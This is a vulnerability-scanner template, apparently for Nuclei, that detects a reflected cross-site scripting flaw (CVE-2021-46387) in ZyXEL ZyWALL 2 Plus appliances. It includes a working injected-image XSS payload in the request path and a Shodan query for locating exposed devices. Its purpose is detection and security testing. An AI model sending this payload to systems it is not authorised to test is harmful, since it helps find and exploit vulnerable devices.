id: CVE-2021-46387
info:
  author: DhiyaneshDk
  classification:
    cve-id: CVE-2021-46387
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: ZyXEL ZyWALL 2 Plus Internet Security Appliance is affected by Cross
    Site Scripting (XSS). Insecure URI handling leads to bypass security restriction
    to achieve Cross Site Scripting, which allows an attacker able to execute arbitrary
    JavaScript codes to perform multiple attacks such as clipboard hijacking and session
    hijacking.
  metadata:
    shodan-query: http.title:"Zywall2Plus"
  name: Zyxel ZyWALL 2 Plus Internet Security Appliance - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/50797
  - https://nvd.nist.gov/vuln/detail/CVE-2021-46387
  - https://www.zyxel.com/us/en/support/security_advisories.shtml
  - https://drive.google.com/drive/folders/1_XfWBLqxT2Mqt7uB663Sjlc62pE8-rcN?usp=sharing
  severity: medium
  tags: cve,cve2021,xss,zyxel
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <iMg src=x onerror="prompt(document.domain)"><form>
    - Entry Error
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror="prompt(document.domain)"><form>'
